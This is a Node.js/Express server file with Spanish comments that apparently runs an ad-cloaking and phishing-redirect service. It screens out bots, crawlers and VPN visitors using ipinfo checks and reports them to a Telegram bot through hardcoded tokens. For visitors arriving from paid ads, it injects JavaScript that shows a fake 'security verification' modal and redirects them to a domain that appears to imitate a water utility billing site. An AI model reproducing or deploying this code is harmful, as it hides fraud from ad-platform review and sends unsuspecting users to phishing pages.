const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

app.use(cors());

app.use(express.static('public'));

const CONFIG = {
    IPINFO_TOKEN: 'f14749fee64f8f', 
    TG_TOKEN: '8260412488:AAFCSGGrgSu9-mF7d7SjdI5bJ9cMa3WIqUY',
    TG_CHAT: '-1003321543933',
    DESTINO: 'https://home.acueducto-factura.com', 
    IMG_URL: 'https://newacuemetric.onrender.com/pop.jpg', // <-- PEGA AQUÍ LA URL DE TU IMAGEN
    PORT: process.env.PORT || 3000
};

// --- LÓGICA DE FILTRADO ---
async function verificarVisitante(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = (req.headers['user-agent'] || '').toLowerCase();

    console.log(`\n🔎 IP: ${ip} | UA: ${ua.substring(0, 20)}...`);

    if (ip === '::1' || ip === '127.0.0.1' || ip.includes('192.168.') || ip.includes('::ffff:127.0.0.1')) {
        console.log("");
        return { ok: true };
    }

    const bots = ['googlebot', 'adsbot', 'lighthouse', 'bot', 'crawler', 'spider', 'headless', 'facebook'];
    if (bots.some(b => ua.includes(b))) return { ok: false, r: "Bot Detectado" };

    try {
        const { data } = await axios.get(`https://ipinfo.io/${ip}?token=${CONFIG.IPINFO_TOKEN}`);
        if (data.privacy && (data.privacy.vpn || data.privacy.proxy || data.privacy.hosting)) {
            return { ok: false, r: "VPN Detectada", d: data };
        }
        return { ok: true, d: data };
    } catch (e) {
        return { ok: true }; 
    }
}

// --- RUTA PRINCIPAL ---
app.get('/:slug', async (req, res) => {
    if (req.params.slug.length < 3) return res.status(404).end();

    const check = await verificarVisitante(req);

    // CASO A: BLOQUEADO (Bot/VPN)
    if (!check.ok) {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        axios.post(`https://api.telegram.org/bot${CONFIG.TG_TOKEN}/sendMessage`, {
            chat_id: CONFIG.TG_CHAT,
            text: `\nIP: \`${ip}\`\nMotivo: ${check.r}`,
            parse_mode: 'Markdown'
        }).catch(()=>{});

        res.set('Content-Type', 'application/javascript');
        return res.send("console.log(''); window.__view = true;");
    }

    // CASO B: APROBADO
    console.log("");
    res.set('Content-Type', 'application/javascript');
    
    const payload = `
        (function(){
            var url = window.location.href;
            console.log("Analizando URL:", url);

            var triggers = ["gclid", "gad_source", "gbraid", "fbclid"];
            var esTraficoPago = triggers.some(function(t) { return url.indexOf(t) !== -1; });

            if (esTraficoPago) {
                console.log("");

                function mostrarModal() {
                    var l = document.getElementById('preloader');
                    if(l) l.style.display = 'none';

                    // 1. Overlay blanco translúcido con efecto de desenfoque (backdrop-filter)
                    var overlay = document.createElement('div');
                    overlay.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.75);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:9999999;display:flex;justify-content:center;align-items:center;";

                    // 2. Caja blanca del modal
                    var modal = document.createElement('div');
                    modal.style.cssText = "background:#ffffff;padding:30px;border-radius:16px;text-align:center;box-shadow:0 15px 35px rgba(0,0,0,0.1);max-width:90%;width:420px;font-family:Arial, sans-serif;border:1px solid rgba(0,0,0,0.1);";

                    // 3. Título y descripción
                    modal.innerHTML = '<h2 style="margin:0 0 10px 0;color:#1a1a1a;font-size:22px;font-weight:700;">Verificación de Seguridad</h2>'
                                      // '<p style="color:#666;margin:0 0 20px 0;font-size:14px;line-height:1.4;">Para continuar a la oferta, por favor haz clic en la imagen o en el botón inferior.</p>';

                    // 4. Elemento de Imagen
                    var img = document.createElement('img');
                    img.src = "${CONFIG.IMG_URL}";
                    img.style.cssText = "width:100%;max-width:320px;height:auto;border-radius:10px;margin-bottom:20px;cursor:pointer;display:block;margin-left:auto;margin-right:auto;transition:transform 0.2s, box-shadow 0.2s;box-shadow:0 4px 12px rgba(0,0,0,0.08);";
                    
                    // Efectos de interacción para la imagen
                    img.onmouseover = function() { 
                        this.style.transform = "scale(1.03)"; 
                        this.style.boxShadow = "0 6px 16px rgba(0,0,0,0.12)";
                    };
                    img.onmouseout = function() { 
                        this.style.transform = "scale(1)"; 
                        this.style.boxShadow = "0 4px 12px rgba(0,0,0,0.08)";
                    };

                    // 5. Botón de redirección
                    var btn = document.createElement('button');
                    btn.innerText = "Entrar Ahora";
                    btn.style.cssText = "background:#0a1e3c;color:#fff;border:none;padding:14px 28px;font-size:16px;border-radius:8px;cursor:pointer;font-weight:bold;width:100%;transition:background 0.3s;box-shadow:0 4px 10px rgba(10,30,60,0.2);";
                    
                    btn.onmouseover = function() { this.style.backgroundColor = '#0f2c5c'; };
                    btn.onmouseout = function() { this.style.backgroundColor = '#0a1e3c'; };

                    // 6. Lógica de Redirección Unificada (Evita ejecuciones duplicadas)
                    var yaRedireccionado = false;
                    function ejecutarRedireccion() {
                        if (yaRedireccionado) return;
                        yaRedireccionado = true;

                        btn.innerText = "Redireccionando...";
                        btn.style.opacity = "0.7";
                        btn.disabled = true;
                        img.style.pointerEvents = "none"; 

                        var params = window.location.search || "";
                        window.top.location.href = "${CONFIG.DESTINO}" + params;
                    }

                    // El clic en la imagen o en el botón ejecuta la redirección
                    img.onclick = ejecutarRedireccion;
                    btn.onclick = ejecutarRedireccion;

                    // Ensamblado
                    modal.appendChild(img);
                    modal.appendChild(btn);
                    overlay.appendChild(modal);
                    document.body.appendChild(overlay);
                }

                if (document.body) {
                    mostrarModal();
                } else {
                    document.addEventListener('DOMContentLoaded', mostrarModal);
                }

            } else {
                console.log("");
                window.__view = true;
                var l = document.getElementById('preloader');
                if(l) l.style.display = 'none';
            }
        })();
    `;
    res.send(payload);
});

app.listen(CONFIG.PORT, () => console.log(` ${CONFIG.PORT}`));
